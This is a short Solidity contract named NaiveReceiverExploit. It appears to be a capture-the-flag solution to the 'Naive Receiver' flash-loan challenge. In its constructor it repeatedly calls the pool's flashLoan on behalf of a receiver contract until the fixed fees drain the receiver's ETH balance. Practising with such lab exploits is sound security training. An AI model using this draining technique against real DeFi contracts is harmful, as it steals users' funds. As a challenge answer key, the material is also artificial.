// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverExploit {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable poolAddress, address receiver) {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
        uint256 receiverBalance = receiver.balance;
        uint256 fixedFee = pool.flashFee(ETH, 0);
        uint256 iterationsToDrain = receiverBalance / fixedFee;
        for (uint256 i = 0; i < iterationsToDrain; i++) {
            pool.flashLoan(IERC3156FlashBorrower(receiver), ETH, 0, "0x");
        }
    }
}
